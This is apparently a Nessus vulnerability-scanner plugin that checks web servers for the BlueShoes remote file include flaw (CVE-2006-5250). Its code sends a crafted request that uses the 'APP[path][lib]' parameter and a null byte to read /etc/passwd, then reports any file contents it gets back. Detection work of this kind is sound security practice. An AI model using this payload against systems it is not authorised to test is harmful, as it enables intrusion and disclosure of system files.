#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to a remote
file include issue. 

Description :

The remote host is using BlueShoes, an application framework and
content management system written in PHP. 

The version of BlueShoes installed on the remote host fails to
sanitize input to the 'APP[path][lib]' parameter before using it to
include PHP code in the 'lib/googlesearch/GoogleSearch.php' script. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this issue to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id. 

See also :

http://www.securityfocus.com/archive/1/448182/30/0/threaded

Solution :

Unknown at this time. 

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22541);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-5250");
  script_bugtraq_id(20450);

  script_name(english:"BlueShoes APP Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read a local file with BlueShoes' Google API");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/_bsLib", "/_bslib", "/lib", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Grab index.php.
  file = "/etc/passwd";
  req = http_get(
    item:string(
      dir, "/googlesearch/GoogleSearch.php?",
      "APP[path][lib]=", file, "%00"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or...
    string("main(", file, "\\0nusoap.php): failed to open stream") >< res ||
    # we get an error claiming the file doesn't exist or...
    string("main(", file, "): failed to open stream: No such file") >< res ||
    # we get an error about open_basedir restriction.
    string("open_basedir restriction in effect. File(", file) >< res
  )
  {
    if (report_verbosity && egrep(string:res, pattern:"root:.*:0:[01]:"))
      report = string(
        desc,
        "\n\n",
       "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
